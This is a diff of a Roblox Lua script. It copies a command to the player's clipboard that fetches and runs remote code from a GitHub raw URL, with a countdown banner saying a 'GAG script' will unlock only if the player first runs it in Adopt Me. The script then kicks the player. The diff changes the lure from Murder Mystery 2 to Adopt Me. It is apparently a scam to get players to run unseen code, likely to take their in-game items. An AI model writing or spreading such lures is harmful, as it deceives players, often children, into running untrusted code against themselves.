@@ -3,7 +3,7 @@ local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 
 -- New clipboard string
-local clipboardString = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/ShxDrag/Scripty/refs/heads/main/Mmforsigma.lua"))()'
+local clipboardString = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/ShxDrag/Scripty/refs/heads/main/ADMMOPSPAWN.lua"))()'
 
 -- Clipboard setup
 if setclipboard then
@@ -50,7 +50,7 @@ gradient.Transparency = NumberSequence.new(0.7)
 local warning = Instance.new("TextLabel", frame)
 warning.Size = UDim2.new(0.9, 0, 0.6, 0)
 warning.Position = UDim2.new(0.05, 0, 0.05, 0)
-warning.Text = "⛔️ TO UNLOCK GAG SCRIPT! [Execute My MM2 Script First]"
+warning.Text = "⛔️ TO UNLOCK GAG SCRIPT! [Execute My Adopt Me Script First]"
 warning.TextColor3 = Color3.fromRGB(255, 255, 255)
 warning.TextTransparency = 0.1
 warning.BackgroundTransparency = 1
@@ -117,7 +117,7 @@ task.spawn(function()
         -- Mid-countdown message change at 10s
         if i == 10 and not messageChanged then
             messageChanged = true
-            warning.Text = "⚠️ Join Murder Mystery 2 And Execute The Script! TO UNLOCK GAG SCRIPT ⚠️"
+            warning.Text = "⚠️ Join Adopt Me And Execute The Script! TO UNLOCK GAG SCRIPT ⚠️"
             subText.Text = "Script is ready in your clipboard!"
             TweenService:Create(warning, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {
                 TextTransparency = 0,
@@ -140,7 +140,7 @@ task.spawn(function()
     countdown.Text = "KICKING…."
     task.wait(0.5)
     gui:Destroy()
-    player:Kick("MM2 Script Copied On Your Clipboard!")
+    player:Kick("Adopt Me Script Copied On Your Clipboard!")
 end)
 
 -- Click-to-copy again
